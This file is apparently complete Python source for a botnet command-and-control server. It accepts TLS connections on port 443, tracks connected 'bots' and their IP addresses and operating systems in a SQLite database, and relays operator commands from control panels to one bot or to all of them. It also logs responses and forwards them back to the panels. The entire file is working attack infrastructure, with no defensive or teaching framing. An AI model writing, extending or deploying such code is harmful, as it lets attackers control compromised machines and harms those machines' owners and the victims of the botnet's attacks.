# c2_server.py
import socket
import threading
import json
import time
import sqlite3
from datetime import datetime
import ssl

class C2Server:
    def __init__(self, host='0.0.0.0', port=443):
        self.host = host
        self.port = port
        self.bots = {}
        self.panels = {}
        self.setup_database()
        
    def setup_database(self):
        self.conn = sqlite3.connect('c2_database.db', check_same_thread=False)
        cursor = self.conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS bots (
                bot_id TEXT PRIMARY KEY,
                ip_address TEXT,
                os TEXT,
                last_seen TIMESTAMP,
                status TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bot_id TEXT,
                command TEXT,
                response TEXT,
                timestamp TIMESTAMP
            )
        ''')
        self.conn.commit()
    
    def start_server(self):
        # Create SSL context for secure connections
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
        
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(100)
        
        print(f"[+] C2 Server listening on {self.host}:{self.port}")
        
        while True:
            client_socket, addr = server_socket.accept()
            # Wrap with SSL
            try:
                ssl_socket = context.wrap_socket(client_socket, server_side=True)
                threading.Thread(target=self.handle_client, args=(ssl_socket, addr), daemon=True).start()
            except:
                client_socket.close()
    
    def handle_client(self, client_socket, addr):
        try:
            while True:
                data = client_socket.recv(4096).decode()
                if not data:
                    break
                
                message = json.loads(data)
                client_type = message.get('type')
                
                if client_type == 'panel_connect':
                    self.handle_panel_connect(client_socket, message, addr)
                elif client_type == 'bot_connect':
                    self.handle_bot_connect(client_socket, message, addr)
                elif client_type == 'bot_response':
                    self.handle_bot_response(message)
                elif client_type == 'panel_command':
                    self.handle_panel_command(message)
                    
        except Exception as e:
            print(f"Error handling client: {e}")
        finally:
            client_socket.close()
    
    def handle_panel_connect(self, socket, message, addr):
        panel_id = message['panel_id']
        self.panels[panel_id] = socket
        print(f"[+] Control panel connected: {panel_id}")
    
    def handle_bot_connect(self, socket, message, addr):
        bot_id = message['bot_id']
        self.bots[bot_id] = {
            'socket': socket,
            'ip': addr[0],
            'os': message.get('os', 'Unknown'),
            'last_seen': datetime.now()
        }
        
        # Update database
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO bots (bot_id, ip_address, os, last_seen, status)
            VALUES (?, ?, ?, ?, ?)
        ''', (bot_id, addr[0], message.get('os', 'Unknown'), datetime.now(), 'Online'))
        self.conn.commit()
        
        # Notify all panels
        notify_message = {
            'type': 'bot_connect',
            'bot_id': bot_id,
            'os': message.get('os', 'Unknown'),
            'ip': addr[0]
        }
        self.broadcast_to_panels(notify_message)
        
        print(f"[+] Bot connected: {bot_id} from {addr[0]}")
    
    def handle_bot_response(self, message):
        bot_id = message['bot_id']
        response = message['response']
        
        # Log in database
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO commands (bot_id, command, response, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (bot_id, 'N/A', response, datetime.now()))
        self.conn.commit()
        
        # Forward to panels
        forward_message = {
            'type': 'bot_response',
            'bot_id': bot_id,
            'response': response
        }
        self.broadcast_to_panels(forward_message)
    
    def handle_panel_command(self, message):
        command_type = message.get('command_type')
        bot_id = message.get('bot_id')
        
        if command_type == 'broadcast':
            # Send to all bots
            for bid, bot_data in self.bots.items():
                self.send_to_bot(bid, message)
        elif bot_id in self.bots:
            # Send to specific bot
            self.send_to_bot(bot_id, message)
    
    def send_to_bot(self, bot_id, message):
        try:
            if bot_id in self.bots:
                socket = self.bots[bot_id]['socket']
                socket.send(json.dumps(message).encode())
        except:
            # Remove disconnected bot
            if bot_id in self.bots:
                del self.bots[bot_id]
    
    def broadcast_to_panels(self, message):
        disconnected_panels = []
        for panel_id, socket in self.panels.items():
            try:
                socket.send(json.dumps(message).encode())
            except:
                disconnected_panels.append(panel_id)
        
        # Clean up disconnected panels
        for panel_id in disconnected_panels:
            del self.panels[panel_id]

if __name__ == "__main__":
    server = C2Server()
    server.start_server()
